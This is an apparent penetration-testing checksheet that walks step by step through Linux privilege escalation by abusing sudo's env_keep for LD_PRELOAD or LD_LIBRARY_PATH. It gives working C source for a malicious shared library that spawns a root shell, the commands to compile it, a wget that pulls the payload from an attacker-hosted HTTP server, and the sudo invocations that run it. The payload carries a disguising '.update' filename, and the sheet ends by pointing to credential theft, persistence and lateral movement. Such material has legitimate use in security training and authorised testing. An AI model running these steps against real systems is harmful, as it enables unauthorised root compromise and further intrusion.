
⚠️ **Hard preconditions — verified in Step 1.**

- **`env_keep` includes `LD_PRELOAD` or `LD_LIBRARY_PATH`** in the sudoers 'Defaults' entries for the current user.
- **Current user can invoke sudo for at least one command** (NOPASSWD or password known).
- **gcc available** — on target (canonical) or on attacker (fallback with `.so` transfer).
- **Non-destructive.** Transient files in `/tmp` only; cleanup in Step 6. IOCs: `auth.log` entry for the `sudo` invocation; `.so` file in `/tmp` during exploitation.

---

## Step 1 — Preflight: route, target binary, compile location

`sudo -l`

Inspect `env_keep` in the 'Defaults' line:

- Contains `LD_PRELOAD` → LD_PRELOAD route (Step 4A)
- Contains `LD_LIBRARY_PATH` but not `LD_PRELOAD` → LD_LIBRARY_PATH route (Step 4B)

**Note any sudo-invokable binary from the 'Cmnd' list as `<binary>` for Step 4 (prefer any other binary to `vim` if possible)**. 

`which gcc`

- Path returned → Step 2 writes source on target as `/tmp/.update.c`; Step 3 target-side
- No output → Step 2 writes source on attacker as `/tmp/update.c`; Step 3 attacker-side (transfer required)

---

## Step 2 — Write payload source

### Target-side (gcc on target per Step 1)

On target:

```bash
cat > /tmp/.update.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    unsetenv("LD_PRELOAD");
    unsetenv("LD_LIBRARY_PATH");
    setuid(0);
    system("/bin/bash");
}
EOF
```

### Attacker-side (no gcc on target per Step 1)

On attacker:

```bash
cat > /tmp/update.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    unsetenv("LD_PRELOAD");
    unsetenv("LD_LIBRARY_PATH");
    setuid(0);
    system("/bin/bash");
}
EOF
```

---

## Step 3 — Compile

### Target-side (gcc on target per Step 1)

```bash
gcc -fPIC -shared -o /tmp/.update.so /tmp/.update.c
rm /tmp/.update.c
```

### Attacker-side (no gcc on target per Step 1)

On attacker:

```bash
gcc -fPIC -shared -o /tmp/.update.so /tmp/update.c
rm /tmp/update.c
```

Transfer to target. In `/tmp` on attacker:

```bash
python3 -m http.server 8000
```

On target:

```bash
wget http://<lhost>:8000/.update.so -O /tmp/.update.so
```

---

## Step 4 — Execute

### Step 4A — LD_PRELOAD route

```bash
sudo LD_PRELOAD=/tmp/.update.so <binary>
```

- Root shell prompt (`#`) → proceed to Step 5
- Password prompt with no creds → password-required entry; technique doesn't bypass auth
- Binary's normal output, no shell → env_keep didn't preserve LD_PRELOAD; re-verify Step 1

### Step 4B — LD_LIBRARY_PATH route

⚠️ You made need the full binary file path here, e.g. `ldd /usr/bin/vim`, which you can find from the `sudo -l` output in step 1.

Check binary hardening: 

```bash 
readelf -d <binary> | grep -E 'BIND_NOW|FLAGS_1.*NOW'
``` 

- Output **non**-empty → binary has BIND_NOW; so this route fails for this binary. Pick another binary from `sudo -l` 'Cmnd' list and re-check. If all listed binaries have BIND_NOW, this route doesn't apply on the target. 
- Output empty → proceed.

```bash
ldd <binary>
```

Pick `<libname>` from output, excluding any matching `libc.so.*`, `ld-linux*`, or `linux-vdso*`.

```bash
cp /tmp/.update.so /tmp/<libname>
sudo LD_LIBRARY_PATH=/tmp <binary>
```

- Root shell prompt (`#`) → proceed to Step 5
- `symbol lookup error: ...: undefined symbol: ...` → binary eagerly references a symbol our spoof doesn't provide (typically a variable); `rm /tmp/<libname>`, pick another `<libname>` from `ldd` output, and repeat the final 'shell' step, immediately above.
- Binary's normal output, no shell → wrong library choice; `rm /tmp/<libname>`, pick another from `ldd` output, repeat

**`<libname>` options exhausted → Pick another binary from `sudo -l` 'Cmnd' list and repeat from the top of Step4B**

---

## Step 5 — Verify

`id`

- Output contains `uid=0` → root achieved.
- Otherwise → return to Step 4.

---

## Step 6 — Cleanup

From the root shell on target:

`rm /tmp/.update.so`

If Step 4B was used, also:

`rm /tmp/<libname>`

---

## Decision

Root shell achieved. Next steps are goal-dependent; common destinations:

- Credential extraction (additional users' hashes, SSH keys, app secrets) → [[Linux Credential Extraction Checksheet]]
- Persistence (SSH key, cron, systemd) → [[Linux Persistence Checksheet]]
- Lateral movement → [[Linux Lateral Movement Checksheet]]


